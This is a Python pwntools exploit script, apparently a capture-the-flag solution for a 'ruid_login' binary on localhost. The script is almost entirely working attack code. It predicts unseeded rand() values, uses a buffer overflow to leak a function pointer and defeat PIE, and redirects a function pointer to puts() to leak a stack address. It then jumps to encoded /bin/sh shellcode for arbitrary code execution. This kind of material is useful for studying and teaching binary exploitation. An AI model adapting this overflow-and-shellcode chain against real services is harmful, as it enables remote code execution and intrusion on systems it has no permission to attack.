from pwn import *
from ctypes import CDLL

# essentially, big thing is that the dean() function has a BOF vulnerability allowing us to write and modify values adjacent to the name
# because of the structure (each entry contains a function pointer to execute), we can essentially get arbitrary function calling
# the goal here is to first make it so, since we can write past the name, remove the null terminator so "%s" also leaks out the adjacent function pointer (bypassing PIE)
# then, we overwrite the function pointer to be puts(). prior printf calling in main() will set RDI to be some stack address that contains another stack address. once we jump to puts(), it will print it, thus giving us a leak to bypass ASLR (90% of the time :P)
# finally, because NX is turned off, we can execute arbitrary shellcode. the netID parameter we are first prompted with will remain at a constant address, so do some math on the leak to get the address of that variable.
# jump to the stack address of that netID, and boom, arbitrary code execution via shellcode.

# no srand() is called in the program, thus default seed 1 is used
libc = CDLL("libc.so.6")
ruids = {
	name: libc.rand()
	for name in ["prof", "dean"]
}

# get the binary
context.binary = ELF("./ruid_login")

# execute the binary
with remote("localhost", 5000) as p:
	# enter the shellcode
	sc = encoders.encode(asm(shellcraft.sh()), avoid=b"\n")
	p.sendlineafter(b"netID: ", sc)

	# firstly, use overflow in dean() to remove null terminator from name
	# this will leak the ruid_func and thus get a PIE leak
	p.sendlineafter(b"RUID: ", str(ruids["dean"]).encode("ascii"))
	p.sendlineafter(b"Num: ", b"0")
	p.sendlineafter(b"New name: ", b"a"*(0x20-1)) #subtract 1 because newline char

	# now, receive all of the name
	# the leak is the address of prof()
	p.recvuntil(b"[0] {RUID REDACTED} " + b"a"*(0x20-1) + b"\n")
	leak = u64(p.recv(6)+b"\x00"*2)
	context.binary.address = leak - context.binary.sym["prof"]
	log.info(f"PIE base: {hex(context.binary.address)}")

	# function to set an RUID_User and call an arbitrary function
	# modify the prof since we need the dean active
	def call_function(func):
		p.sendlineafter(b"RUID: ", str(ruids["dean"]).encode("ascii"))
		p.sendlineafter(b"Num: ", b"0")
		p.sendlineafter(b"New name: ", b"a"*0x20 + p64(func))
		p.sendlineafter(b"RUID: ", str(ruids["prof"]).encode("ascii"))

		# receive the lines that don't matter
		for i in range(3):
			p.recvline()

	# for the call_function exploit
	# it sets the RUID to the LSB is a newline
	# replicate this change
	ruids["prof"] = list(p64(ruids["prof"]))
	ruids["prof"][0] = 0xa
	ruids["prof"] = u64(bytes(ruids["prof"]))

	# from here, we must use a function to leak out a stack address
	# during the call to rax (the ruid_func) RDI is set to a stack addr that points to a stack addr
	# this means we can utilize puts() to simply leak it out
	call_function(context.binary.plt["puts"])
	stack_leak = u64(p.recv(6)+b"\x00"*2)
	log.info(f"Stack leak: {hex(stack_leak)}")

	# use GDB to break at where it reads our "netID"
	# calculate the offset between the stack leak and the netID buffer
	stack_leak += 448

	# we can now jump to our shellcode
	call_function(stack_leak)
	p.interactive()
